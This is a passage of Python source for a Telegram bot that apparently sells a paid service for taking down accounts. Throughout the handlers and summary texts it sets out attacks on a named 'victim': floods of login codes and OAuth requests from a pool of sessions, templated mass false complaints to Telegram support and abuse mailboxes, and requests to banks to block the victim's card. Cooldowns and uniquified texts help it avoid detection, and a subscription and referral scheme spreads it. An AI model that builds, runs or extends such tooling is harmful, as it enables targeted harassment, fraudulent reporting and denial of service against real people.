                + (f" | {html_mod.escape(str(d.get('err', '')))}" if d.get('err') else "")
                for d in data.get("support", [])]
    await push_send_log(
        "Сброс сессий",
        [f"🎯 @{html_mod.escape(username)}  📱 <code>{phone}</code>",
         "🛰 SendCode:"] + sc_lines +
        ["🌐 OAuth:"] + oa_lines +
        (["✉️ Support:"] + sp_lines if sp_lines else []))

    progress["done"] = True
    return data


def _snos_bars(progress: dict) -> str:
    """Live progress bars for the snos animation."""
    def _bar(done: int, total: int) -> str:
        if not total:
            return ""
        frac = max(0.0, min(1.0, done / total))
        fill = int(round(frac * 8))
        return "\u2593" * fill + "\u2591" * (8 - fill)

    lines = []
    sc_t = progress.get("sc_total", 0)
    if sc_t:
        sc_d = progress.get("sc_done", 0)
        sc_ok = progress.get("sc_ok", 0)
        lines.append(f"\U0001f4f2 SendCode {_bar(sc_d, sc_t)} {sc_d}/{sc_t}"
                     + (f" \u2705{sc_ok}" if sc_ok else ""))
    oa_t = progress.get("oa_total", 0)
    if oa_t:
        oa_d = progress.get("oa_done", 0)
        lines.append(f"\U0001f310 OAuth {_bar(oa_d, oa_t)} {oa_d}/{oa_t}")
    sp_t = progress.get("sp_total", 0)
    if sp_t:
        sp_d = progress.get("sp_done", 0)
        sp_ok = progress.get("sp_ok", 0)
        lines.append(f"\U0001f4e8 Support {_bar(sp_d, sp_t)} {sp_d}/{sp_t}"
                     + (f" \u2705{sp_ok}" if sp_ok else ""))
    if not lines:
        return ""
    return "\n".join(lines) + "\n"


# ── snos: UI state bits ─────────────────────────────────
def kb_snos_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
    ])


def kb_snos_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5267123797600783095", style="danger", callback_data="snosrun:yes"),
         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5267123797600783095", callback_data="snosrun:no")],
    ])


def snos_summary_text(data: dict) -> str:
    username = data["username"]
    phone = data["phone"]
    return (
        bq(f"<b>{NAME}</b>  \u2014  \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
        + "\n\n"
        + f"\U0001f3af <b>\u0416\u0435\u0440\u0442\u0432\u0430:</b> @{html_mod.escape(username)}\n"
        + f"\U0001f4f1 <b>\u041d\u043e\u043c\u0435\u0440:</b> <code>{html_mod.escape(phone)}</code>\n\n"
        + f"\U0001f4f2 <b>SendCode:</b> \u0444\u043b\u0443\u0434 \u043a\u043e\u0434\u043e\u0432 \u2014 \u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440 \u0430\u043a\u0442\u0438\u0432\u0435\u043d\n"
        + f"\U0001f310 <b>OAuth:</b> \u043f\u0430\u043a\u0435\u0442 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u2014 \u0433\u043e\u0442\u043e\u0432\n"
        + f"\U0001f4e8 <b>Web support:</b> 3 \u0436\u0430\u043b\u043e\u0431\u044b \u2014 \u0433\u043e\u0442\u043e\u0432\u043e\n"
        + f"\U0001f50d <b>\u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433:</b> \u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d"
    )
# ── helpers ─────────────────────────────────────────────
async def safe_edit(msg, text: str, **kwargs):
    try:
        await msg.edit_caption(caption=text, **kwargs)
    except Exception:
        await msg.edit_text(text=text, **kwargs)


def parse_target(text: str) -> dict:
    text = text.strip()
    m = LINK_RE.match(text)
    if m:
        ent = m.group(1)
        if re.search(r"t\.me/c/", text, re.I) and ent.isdigit():
            ent = int("-100" + ent)   # private supergroup chat id
        return {"raw": text, "entity": ent,
                "msg_id": int(m.group(2)) if m.group(2) else None, "type": "link"}
    if text.startswith("@"):
        return {"raw": text, "entity": text.lstrip("@"), "msg_id": None, "type": "username"}
    return {"raw": text, "entity": text, "msg_id": None, "type": "raw"}


def report_target_link(raw, msg_id: int | None = None) -> str:
    s = str(raw or "").strip()
    if s.startswith(("http://", "https://")):
        return s
    if s.startswith("-100"):
        base = f"https://t.me/c/{s[4:]}"
    else:
        base = f"https://t.me/{s.lstrip('@')}"
    if msg_id:
        base += f"/{msg_id}"
    return base


def report_target_html(raw, msg_id: int | None = None, label: str | None = None) -> str:
    shown = label if label is not None else (
        str(raw) + (f" #{msg_id}" if msg_id else ""))
    href = html_mod.escape(report_target_link(raw, msg_id), quote=True)
    return f'<a href="{href}">{html_mod.escape(shown)}</a>'



def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="\u0417\u0430\u043f\u0443\u0441\u043a", icon_custom_emoji_id="5323404142809467476", style="danger", callback_data="menu:launch")],
        [InlineKeyboardButton(text="\u041f\u0440\u043e\u0444\u0438\u043b\u044c", icon_custom_emoji_id="5256143829672672750", callback_data="menu:profile"),
         InlineKeyboardButton(text="\u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430", icon_custom_emoji_id="5258204546391351475", callback_data="menu:subs")],
        [InlineKeyboardButton(text="\u0420\u0435\u0444\u0435\u0440\u0430\u043b\u044b", icon_custom_emoji_id="5298988357538328017", callback_data="menu:refs")],
        [InlineKeyboardButton(text="\u0417\u0435\u0440\u043a\u0430\u043b\u0430", icon_custom_emoji_id="5258254475386167466", callback_data="menu:mirror_list")],
    ]

    if ADMIN_ID and user_id == int(ADMIN_ID):
        rows.append([InlineKeyboardButton(text="\u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f", icon_custom_emoji_id="5258391025281408576", callback_data="menu:telemetry"),
                     InlineKeyboardButton(text="\u0412\u044b\u0434\u0430\u0442\u044c", icon_custom_emoji_id="5258476306152038031", callback_data="menu:grant")])
        rows.append([InlineKeyboardButton(text="Сессия", icon_custom_emoji_id="5359529383319084413", callback_data="menu:addsess")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_methods(tier: str = "normal") -> InlineKeyboardMarkup:
    order = ["web", "mail", "bank", "telegraph", "dsa", "bot", "channel",
             "message", "account", "manual"]
    icons = {
        "web": "5258423306255604960", "mail": "5260268501515377807",
        "bank": "5258204546391351475", "bot": "5258093637450866522",
        "channel": "5260325873688518261", "message": "5427181942934088912",
        "telegraph": "5370546867786523009",
        "dsa": "5258165702707125574",
    }
    keys = [k for k in order if (k in PREMIUM_METHODS) == (tier == "premium")]
    rows, row = [], []
    for k in keys:
        btn = InlineKeyboardButton(
            text=METHODS[k]["l"], callback_data=f"method:{k}")
        if k in icons:
            btn = InlineKeyboardButton(
                text=METHODS[k]["l"], icon_custom_emoji_id=icons[k],
                callback_data=f"method:{k}")
        row.append(btn)
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([InlineKeyboardButton(
        text="\u041d\u0430\u0437\u0430\u0434",
        icon_custom_emoji_id="5258132936401624790",
        callback_data="back:tiers")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_tiers(premium: bool = False) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(
        text="\U0001f3c5 \u041e\u0431\u044b\u0447\u043d\u044b\u0435",
        callback_data="tier:normal")]]
    if premium:
        rows.append([InlineKeyboardButton(
            text="\u041f\u0440\u0435\u043c\u0438\u0443\u043c",
            icon_custom_emoji_id="5258165702707125574",
            callback_data="tier:premium")])
    rows.append([InlineKeyboardButton(
        text="\u041d\u0430\u0437\u0430\u0434",
        icon_custom_emoji_id="5258132936401624790",
        callback_data="back:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_reasons(method: str = "") -> InlineKeyboardMarkup:
    rows = []
    if method == "bot":
        items = [(k, {"l": v["e"] + " " + v["l"]})
                 for k, v in BOT_REASONS.items()]
    elif method == "channel":
        items = [(k, {"l": v["e"] + " " + v["l"]})
                 for k, v in CHANNEL_REASONS.items()]
    else:
        items = list(REASONS.items())
    for i in range(0, len(items), 2):
        row = []
        for k, v in items[i:i + 2]:
            row.append(InlineKeyboardButton(
                text=v['l'], callback_data=f"reason:{k}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_skip() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c", icon_custom_emoji_id="5204189706237004154", callback_data="skip_comment")],
        [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
    ])


def kb_comment_step() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✍️ Свой текст жалобы", callback_data="cmt:custom"),
         InlineKeyboardButton(text="🎲 Авто-шаблон", callback_data="cmt:auto")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="cmt:back")],
    ])


def comment_step_text(data: dict) -> str:
    m = METHODS[data["method"]]
    r = reason_meta(data.get("reason") or "spam")
    t = data["target"]
    return (
        bq(f"<b>{NAME}</b>  —  Текст жалобы")
        + f"\n\n{m['e']} <b>Метод:</b> {m['l']}"
        + f"\n🎯 <b>Цель:</b> <code>{html_mod.escape(str(t['raw']))}</code>"
        + f"\n⚠️ {r['e']} {r['l']}"
        + "\n\nВыбери, каким текстом жаловаться:"
    )


def kb_confirm() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", icon_custom_emoji_id="5357069174512303778", callback_data="confirm:yes"),
         InlineKeyboardButton(text="\u041e\u0442\u043c\u0435\u043d\u0430", icon_custom_emoji_id="5267123797600783095", callback_data="confirm:no")],
    ])


def summary_text(data: dict) -> str:
    r = reason_meta(data.get("reason") or "spam")
    t = data["target"]
    m = METHODS[data["method"]]
    c = data.get("comment", "")
    if data["method"] == "account":
        c = PROFILE_REPORT_TEXT
    if not c:
        # resolve the auto text now so the admin sees the real payload
        c = pick_comment(data["reason"], data.get("method"))
        if len(c) > 120:
            c = c[:117] + "..."
    lines = [
        bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435"),
        "",
        f"{m['e']} <b>\u041c\u0435\u0442\u043e\u0434:</b>  {m['l']}",
        f"\U0001f3af <b>\u0426\u0435\u043b\u044c:</b>  <code>{t['raw']}</code>",
    ]
    if t.get("msg_id"):
        lines.append(f"\U0001f4e8 <b>ID:</b>  <code>#{t['msg_id']}</code>")
    if data["method"] == "session":
        lines.append("🔑 Снос сессий жертвы: SendCode-флуд с пула, OAuth-флуд, "
                     "3 жалобы на telegram.org/support + монитор.")
        lines.append(f"📱 Номер жертвы: <code>{t.get('phone', '')}</code>.")
    elif data["method"] == "telegraph":
        _pool_n = len(_mail_load_pool())
        lines.append(f"📝 Сендеры: <b>{max(1, _pool_n // 3)}/{_pool_n}</b> (1/3 пула), "
                     f"писем: <b>{max(1, _pool_n // 3) * len(TELEGRAPH_RECIPIENTS)}</b> "
                     "→ 3 ящика Telegram.")
        lines.append("✍️ Свой текст = тело письма; пусто — авто-текст EN с уникализацией.")
    elif data["method"] == "code":
        # code-flood sends login codes, not complaints — no reason/text here
        lines.append("\U0001f4f2 \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044e <b>25 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430</b> \u043d\u0430 \u043d\u043e\u043c\u0435\u0440.")
    elif data["method"] == "mail":
        pool_n = len(_mail_load_pool())
        n_use = max(1, pool_n // 3)
        lines.append(f"📧 Сендеры: <b>{n_use}/{pool_n}</b> (1/3 пула), писем: <b>{n_use * len(MAIL_RECEIVERS)}</b> → 4 ящика Telegram.")
        lines.append(f"✉️ Тематика: <b>{r['e']} {r['l']}</b> · тексты шаблонные, уникальные.")
    elif data["method"] == "message":
        lines.append("🎲 <b>Категории случайные:</b> 9 байтов на сессию, "
                     "текст — свой или из общего пула.")
        lines.append(f"💬 <b>Комментарий:</b>  {c}")
    else:
        lines += [
            f"\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b>  {r['e']} {r['l']}",
            f"\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b>  {c}",
        ]
    return "\n".join(lines)


# ── /start ──────────────────────────────────────────────
@router.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    botRefCtx["bot"] = msg.bot   # referral context ready
    await state.clear()
    uid = msg.from_user.id

    # register user first (sets rec["_first"]) for captcha gate
    rec = touch_user(msg.from_user)

    # captcha gate for brand-new participants
    verifiedRecently = CAPTCHA_VERIFIED.get(uid, 0)
    if rec.get("_first") and time.time() - verifiedRecently > 60:
        try:
            from captcha import generate_captcha
        except ImportError:
            generate_captcha = None
        if generate_captcha and not CAPTCHA_PENDING.get(uid):
            png, meta, _ch = generate_captcha(uid)
            CAPTCHA_PENDING[uid] = {"meta": meta, "ts": time.time()}
            kb = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="1️⃣", callback_data="cap:0"),
                InlineKeyboardButton(text="2️⃣", callback_data="cap:1"),
                InlineKeyboardButton(text="3️⃣", callback_data="cap:2"),
            ], [
                InlineKeyboardButton(text="4️⃣", callback_data="cap:3"),
                InlineKeyboardButton(text="5️⃣", callback_data="cap:4"),
                InlineKeyboardButton(text="6️⃣", callback_data="cap:5"),
            ]])
            await state.set_state(Captcha.solve)
            await msg.answer_photo(
                photo=BufferedInputFile(png, filename="captcha.png"),
                caption=_cx((
                    bq(f"<b>{NAME}</b>  \u00b7  <i>\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430</i>")
                    + "\n\n\U0001f9dd <b>\u0414\u043e\u043a\u0430\u0436\u0438, \u0447\u0442\u043e \u0442\u044b \u043d\u0435 \u0431\u043e\u0442:</b>"
                    + "\n\u0432\u044b\u0431\u0435\u0440\u0438 \u043a\u043b\u0435\u0442\u043a\u0443 \u0441 \u043d\u0443\u0436\u043d\u044b\u043c \u0441\u043b\u043e\u0432\u043e\u043c"
                )),
                parse_mode=ParseMode.HTML,
                show_caption_above_media=True,
                reply_markup=kb,
            )
            return
    if not rec.get("ref_by"):
        args_text = msg.text or ""
        m = re.search(r"ref_(\d+)", args_text)
        rm = re.match(r"^ref_(\d+)$", m.group(1)) if m else None
        if rm:
            referrer_id = int(rm.group(1))
            status = set_referral(msg.from_user, referrer_id)
            if status == "added":
                try:
                    await msg.bot.send_message(
                        referrer_id, _cx(
                        bq(f"\U0001f389 <b>{NAME}</b>")
                        + "\n\n\U0001f465 <b>\u041d\u043e\u0432\u044b\u0439 \u0440\u0435\u0444\u0435\u0440\u0430\u043b!</b>\n"
                        + f"\U0001f464 <b>{html_mod.escape(msg.from_user.full_name)}</b>"
                        + "\n\n\U0001f4e5 \u0415\u0449\u0451 \u043d\u0435\u043c\u043d\u043e\u0433\u043e \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u043e\u0432 \u2014 <b>+1 \u0434\u0435\u043d\u044c \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438</b>"),
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                await msg.answer(_cx(
                    bq(f"<b>{NAME}</b>  \u2014  \u0440\u0435\u0444\u0435\u0440\u0430\u043b")
                    + "\n\n\u2705 <b>\u0422\u044b \u043f\u0440\u0438\u0432\u044f\u0437\u0430\u043d \u043a \u043f\u0440\u0438\u0433\u043b\u0430\u0441\u0438\u0432\u0448\u0435\u043c\u0443!</b>\n"
                    + "\U0001f4eb \u041f\u043e\u0434\u043f\u0438\u0448\u0438\u0441\u044c \u043d\u0430 \u043a\u0430\u043d\u0430\u043b \u2014 \u044d\u0442\u043e \u0437\u0430\u0447\u0435\u0442\u0451\u0442\u0441\u044f \u0435\u043c\u0443 \u0432 \u0441\u0447\u0451\u0442."),
                    parse_mode=ParseMode.HTML)

    caption = hero_caption(uid)
    await send_hero(
        msg,
        caption=_cx(caption),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(uid),
    )


async def count_valid_refs_async_check():
    """Hook for future deferred validation (noop now)."""
    return None


# ── main menu ───────────────────────────────────────────
# ── wash flag / per-method cooldown / session-rest gates ──
METHOD_COOLDOWN_SEC = 20 * 60
SESSION_REST_SEC = 400
WASH_ETA_SEC = 300
COOLDOWN_FILE = Path(__file__).parent / "method_cooldown.json"
_CD_PUT_TASKS: set = set()
_wash_cache: tuple[float, int] = (0, 0)


def _cooldown_local() -> dict:
    try:
        return json.loads(COOLDOWN_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}


async def wash_active_seconds() -> int:
    """>0 = washer running: seconds until sessions are back."""
    global _wash_cache
    now = time.time()
    if now - _wash_cache[0] < 20:
        return _wash_cache[1]
    eta = 0
    txt = await store._gh_get_text("wash_status.json")
    if txt:
        try:
            st = json.loads(txt)
            if st.get("active"):
                started = float(st.get("started") or now)
                eta = max(1, int(min(
                    float(st.get("eta") or WASH_ETA_SEC),
                    WASH_ETA_SEC - (now - started))))
        except Exception:
            eta = 0
    _wash_cache = (now, eta)
    return eta


async def method_cooldown_left(uid: int, method: str) -> int:
    # local file is written on every set in this single-bot process; a remote
    # GitHub read here cost seconds on every callback and expired queries.
    d = _cooldown_local()
    ts = (d.get(str(uid)) or {}).get(method) or 0
    return max(0, int(METHOD_COOLDOWN_SEC - (time.time() - float(ts))))


async def method_cooldown_set(uid: int, method: str) -> None:
    d = _cooldown_local()
    d.setdefault(str(uid), {})[method] = time.time()
    txt = json.dumps(d, ensure_ascii=False, indent=1)
    try:
        COOLDOWN_FILE.write_text(txt, encoding="utf-8")
    except Exception:
        pass
    try:
        # fire-and-forget: never make a user wait on a GitHub write just to
        # acknowledge a button press.
        _t = asyncio.create_task(store._gh_put_text(
            "method_cooldown.json", txt, f"cooldown {uid} {method}"))
        _CD_PUT_TASKS.add(_t)
        _t.add_done_callback(_CD_PUT_TASKS.discard)
    except Exception:
        pass


def sessions_rest_left() -> int:
    """0 if any session can attack; else seconds until the first thaws."""
    led = _ledger_load()
    waits = []
    for s in load_sessions():
        ok, _why = session_usable(s.stem, led)
        if ok:
            return 0
        rest = (led.get(s.stem) or {}).get("rest_until") or 0
        if rest > time.time():
            waits.append(int(rest - time.time()))
    return min(waits) if waits else 0


@router.callback_query(F.data == "menu:launch")
async def menu_launch(cb: CallbackQuery, state: FSMContext):
    botRefCtx["bot"] = cb.bot   # ref counting needs the bot anywhere
    await cb.answer()   # ack NOW — GitHub reads below may exceed Telegram's 10s
    if await wash_active_seconds():
        await cb.message.answer(
            "Сессии на данный момент обновляются. Подождите 5 минут.")
        return
    if not await channel_gate(cb, state):
        return
    if not await sub_gate(cb, state):
        return
    await refs_check_and_grant(cb)
    await state.clear()
    prem = has_premium(load_subs(), cb.from_user.id)
    await cb.message.edit_caption(
        caption=_cx(bq(f"<b>{NAME}</b>")
                    + "\n\n\U0001f3af <b>\u041a\u0430\u043a\u0443\u044e \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u043e\u0442\u043a\u0440\u044b\u0442\u044c?</b>"),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_tiers(prem),
    )
    await state.set_state(Report.tier)


@router.callback_query(Report.tier, F.data.startswith("tier:"))
async def got_tier(cb: CallbackQuery, state: FSMContext):
    tier = cb.data.split(":", 1)[1]
    if tier == "premium" and not has_premium(load_subs(), cb.from_user.id):
        await cb.answer("\u2b50 \u041d\u0443\u0436\u043d\u0430 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u041f\u0440\u0435\u043c\u0438\u0443\u043c", show_alert=True)
        return
    await state.update_data(tier=tier)
    await cb.message.edit_caption(
        caption=_cx(bq(f"<b>{NAME}</b>")
                    + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>"),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_methods(tier),
    )
    await state.set_state(Report.method)
    await cb.answer()


@router.callback_query(F.data == "back:tiers")
async def back_tiers(cb: CallbackQuery, state: FSMContext):
    prem = has_premium(load_subs(), cb.from_user.id)
    await state.set_state(Report.tier)
    await cb.message.edit_caption(
        caption=_cx(bq(f"<b>{NAME}</b>")
                    + "\n\n\U0001f3af <b>\u041a\u0430\u043a\u0443\u044e \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044e \u043c\u0435\u0442\u043e\u0434\u043e\u0432 \u043e\u0442\u043a\u0440\u044b\u0442\u044c?</b>"),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_tiers(prem))
    await cb.answer()


@router.callback_query(Report.method, F.data.startswith("method:"))
async def got_method(cb: CallbackQuery, state: FSMContext):
    key = cb.data.split(":", 1)[1]
    if key not in METHODS:
        await cb.answer("\u274c", show_alert=True)
        return
    d0 = await state.get_data()
    if key in PREMIUM_METHODS and d0.get("tier") != "premium":
        await cb.answer("\u2b50 \u0422\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0435\u043c\u0438\u0443\u043c", show_alert=True)
        return
    if key in PREMIUM_METHODS and not has_premium(load_subs(), cb.from_user.id):
        await cb.answer("\u2b50 \u041d\u0443\u0436\u043d\u0430 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0430 \u041f\u0440\u0435\u043c\u0438\u0443\u043c", show_alert=True)
        return
    _extra = {"method": key}
    if key == "account":
        _extra["reason"] = "drugs"
    elif key in ("session", "telegraph"):
        _extra["reason"] = "other"
    await state.update_data(**_extra)
    m = METHODS[key]
    if key == "manual":
        usd, rub = manual_price()
        await cb.message.edit_caption(
            caption=_cx((
                bq(f"<b>{NAME}</b>")
                + "\n\n🛠 <b>Ручное удаление</b>\n\n"
                + "Напиши <code>@eraser_support</code> за ручным удалением — "
                  "вся команда Arch V3 серьёзно попотеет над целью.\n"
                + "Работаем <b>только по предоплате</b>.\n\n"
                + f"💳 Цена: <b>{MANUAL_STARS} ⭐</b> "
                  f"(≈ <b>{usd:.2f} $</b> / <b>{rub} ₽</b>)"
            )),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(
                    text="@eraser_support",
                    url="https://t.me/eraser_support")],
                [InlineKeyboardButton(
                    text="Назад", icon_custom_emoji_id="5258132936401624790",
                    callback_data="back:methods")],
            ]))
        await state.clear()
        await cb.answer()
        return
    if key in ("session", "telegraph", "account"):
        await cb.message.edit_caption(
            caption=_cx((
                bq(f"<b>{NAME}</b>")
                + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
                + "\U0001f50d " + m["hint"]
            )),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
            ]),
        )
        await state.set_state(Report.target)
        await cb.answer()
        return
    if key == "bank":
        await cb.message.edit_caption(
            caption=_cx((
                bq(f"<b>{NAME}</b>")
                + "\n\n\U0001f3e6 <b>\u0411\u0430\u043d\u043a (115-\u0424\u0417)</b>\n\n"
                + "\u0412\u044b\u0431\u0435\u0440\u0438 \u0431\u0430\u043d\u043a \u0434\u043b\u044f \u0437\u0430\u044f\u0432\u043a\u0438 \u043d\u0430 \u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B:"
            )),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="\u0422-\u0411\u0430\u043D\u043A", callback_data="bank:tbank"),
                 InlineKeyboardButton(text="\u0410\u043B\u044C\u0444\u0430", callback_data="bank:alfa")],
                [InlineKeyboardButton(text="\u0421\u0431\u0435\u0440", callback_data="bank:sber"),
                 InlineKeyboardButton(text="\u041E\u0437\u043E\u043D", callback_data="bank:ozon")],
                [InlineKeyboardButton(text="\u041D\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
            ]),
        )
        await state.set_state(Report.bank)
        await cb.answer()
        return
    await cb.message.edit_caption(
        caption=_cx((
            bq(f"<b>{NAME}</b>")
            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_reasons(key),
    )
    await state.set_state(Report.reason)
    await cb.answer()


@router.callback_query(F.data == "back:methods")
async def back_methods(cb: CallbackQuery, state: FSMContext):
    tier = (await state.get_data()).get("tier") or "normal"
    await state.set_state(Report.method)
    await cb.message.edit_caption(
        caption=_cx(bq(f"<b>{NAME}</b>") + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>"),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_methods(tier),
    )
    await cb.answer()


@router.callback_query(F.data == "menu:refs")
async def menu_refs(cb: CallbackQuery, state: FSMContext):
    botRefCtx["bot"] = cb.bot
    users = load_users()
    rec = users.get(str(cb.from_user.id), {})
    refs = rec.get("refs") or []
    valid = await count_valid_refs_async(cb.from_user.id)
    grants = rec.get("ref_grants", 0) or 0
    total = len(refs)
    uname = cb.from_user.username
    me = await cb.bot.me()
    bot_uname = me.username
    # ссылка всегда с реферальным кодом приглашающего
    link = f"https://t.me/{bot_uname}?start=ref_{cb.from_user.id}"

    rules = (
        f"• Каждый брат по твоей ссылке попадёт в бот с меткой твоего кода <code>ref_{cb.from_user.id}</code>"
        + f"\n• Реферал зачитывается <b>только</b> если он подписан"
          f"\n  на канал"
        + f"\n• <b>{REF_BONUS}</b> подписавшихся по твоей ссылке = "
          f"<b>+1 день подписки</b>"
        + "\n• Бонус начисляется автоматически при проверке"
    )
    text = (
        bq(f"<b>{NAME}</b>  ·  Рефералы")
        + f"\n\n👥 <b>Приглашено:</b> {total}"
        + f"\n✅ <b>Зачитано (подписаны):</b> {valid}"
        + f"\n🎁 <b>Начислено дней:</b> {grants}"
        + f"\n⏳ <b>До следующего дня:</b> {max(0, REF_BONUS - (valid % REF_BONUS)) if valid else REF_BONUS} чел."
        + "\n\n" + bqe(rules)
        + "\n\n<i>Твоя ссылка:</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Поделиться ссылкой", icon_custom_emoji_id="5260268501515377807",
                             url=f"https://t.me/share/url?url={link}&text=Arch%20V3%20-%20жалобы%20и%20сброс%20сессий"),
    ], [
        InlineKeyboardButton(text="Проверить заново", icon_custom_emoji_id="5260687119092817530", callback_data="menu:refs"),
        InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home"),
    ]])
    await cb.message.edit_caption(caption=_cx(text), parse_mode=ParseMode.HTML,
                                  reply_markup=kb)
    await cb.answer()


async def refs_check_and_grant(cb: CallbackQuery):
    """Validated refs -> auto-grant bonus days (tier1) + tier2 deep-referral chain."""
    users = load_users()
    rec = users.get(str(cb.from_user.id), {})
    valid = await count_valid_refs_async(cb.from_user.id)
    grants = rec.get("ref_grants", 0)
    due = valid // REF_BONUS if valid else 0
    if due > grants:
        days = (due - grants)
        s, until = grant_ref_bonus(cb.from_user.id, days)
        rec["ref_grants"] = due

        # tier2 bonus: when one of your refs THEMSELVES invites 5 valid refs,
        # you get +1 extra day. Deep-chain boost.
        for rid in (rec.get("refs") or []):
            r2 = users.get(str(rid), {})
            if (r2.get("ref_grants", 0) or 0) >= 1 and not r2.get("_t2_credited", False):
                s, until2 = grant_ref_bonus(cb.from_user.id, 1)
                rec["deep_refs"] = (rec.get("deep_refs", 0) or 0) + 1
                r2["_t2_credited"] = True
                users[str(rid)] = r2
                try:
                    await cb.bot.send_message(
                        cb.from_user.id, _cx(
                        bq(f"🎁 <b>{NAME}</b>")
                        + "\n\n🌐 <b>Рефер 2-го уровня!</b>"
                        + f"\n<b>+1 дн.</b> за то, что твой пригл. сам привёл 5."),
                        parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                break

        users[str(cb.from_user.id)] = rec
        save_users(users)
        persist_now("users", f"ref grants due={due} uid={cb.from_user.id}")
        state = "finished"
        await cb.bot.send_message(
            cb.from_user.id, _cx(
            bq(f"🎁 <b>{NAME}</b>") +
            f"\n\n\U0001f4e5 <b>+{days} дн. подписки начислено!</b>"
            + f"\nПриглашено валидно: <b>{valid}</b>"
            + f"\nПодписка активна до: <b>{until}</b>"
            + (f"\n🌐 Рефер 2-го уровня: всего {rec.get('deep_refs') or 0}" if rec.get("deep_refs") else "")),
            parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "menu:profile")
async def menu_profile(cb: CallbackQuery):
    u = cb.from_user
    username = u.username or "\u2014"
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    if s == "admin":
